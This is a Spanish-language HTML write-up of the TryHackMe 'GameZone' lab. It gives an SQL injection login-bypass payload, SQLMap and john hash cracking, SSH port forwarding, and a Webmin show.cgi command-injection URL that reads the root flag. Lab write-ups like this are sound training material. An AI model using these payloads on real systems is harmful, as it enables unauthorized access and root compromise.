@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>THM - GameZone | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-info text-dark fs-6">TryHackMe</span>
+        <span class="badge bg-success fs-6">Medium</span>
+        <span class="badge bg-secondary">Linux</span>
+        <span class="badge bg-secondary">SQLi</span>
+        <span class="badge bg-secondary">SQLMap</span>
+        <span class="badge bg-secondary">Webmin</span>
+        <span class="badge bg-secondary">SSH Tunneling</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">GameZone</h1>
+      <p class="text-secondary mb-3">SQLi login bypass; hash dump con SQLMap crackeado con john; acceso Webmin via SSH port forwarding para RCE root.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">sqlmap</span>
+        <span class="badge bg-dark border border-secondary p-2">john</span>
+        <span class="badge bg-dark border border-secondary p-2">ssh</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p 22,80 10.10.196.59 -oN targeted</code></pre>
+      </div><img src="img/thm-gamezone/0415150332.png" class="img-fluid rounded mb-3 border border-secondary" alt="nmap scan">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-database"></i> SQLi - Login Bypass</h4>
+      <p class="text-secondary">La pagina de login es vulnerable a SQL injection:</p>
+      <div class="code-block mb-3"><pre><code>Login: 'or 1=1 -- -
+Password: ' or 1=1 -- -</code></pre></div><img src="img/thm-gamezone/0415160453.png" class="img-fluid rounded mb-3 border border-secondary" alt="login bypass">
+      <img src="img/thm-gamezone/0415160426.png" class="img-fluid rounded mb-3 border border-secondary" alt="portal logged in">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-database"></i> SQLMap - Hash Dump</h4>
+      <p class="text-secondary">Interceptamos la peticion con Burp Suite y la pasamos a SQLMap:</p>
+      <img src="img/thm-gamezone/0415170533.png" class="img-fluid rounded mb-3 border border-secondary" alt="burp request">
+      <img src="img/thm-gamezone/0415180606.png" class="img-fluid rounded mb-3 border border-secondary" alt="sqlmap">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256</code></pre>
+      </div><img src="img/thm-gamezone/0415180625.png" class="img-fluid rounded mb-3 border border-secondary" alt="cracked">
+      <div class="code-block mb-3"><pre><code># password: videogamer124</code></pre></div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-warning border-left-warning mb-3"><i class="bi bi-terminal"></i> SSH + Port Forwarding - Webmin</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>ssh agent47@10.10.196.59
+# password: videogamer124</code></pre>
+      </div><div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>ss -tulpn</code></pre>
+      </div><img src="img/thm-gamezone/0415180636.png" class="img-fluid rounded mb-3 border border-secondary" alt="ports">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>ssh -L 10000:localhost:10000 agent47@10.10.196.59</code></pre>
+      </div><img src="img/thm-gamezone/0415190722.png" class="img-fluid rounded mb-3 border border-secondary" alt="webmin">
+      <img src="img/thm-gamezone/0415190726.png" class="img-fluid rounded mb-3 border border-secondary" alt="exploit read">
+      <p class="text-secondary">RCE en Webmin via /file/show.cgi:</p>
+      <div class="code-block mb-3"><pre><code>http://localhost:10000/file/show.cgi/bin/7|cat /root/root.txt|</code></pre></div><img src="img/thm-gamezone/0415190706.png" class="img-fluid rounded mb-3 border border-secondary" alt="rce webmin">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>SQL injection en formularios de login puede dar acceso sin credenciales validas.</li>
+<li>SQLMap automatiza la extraccion de datos de bases de datos vulnerables a SQLi.</li>
+<li>El port forwarding SSH permite acceder a servicios internos solo visibles localmente.</li></ul>
+    </section>
+  </main>
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
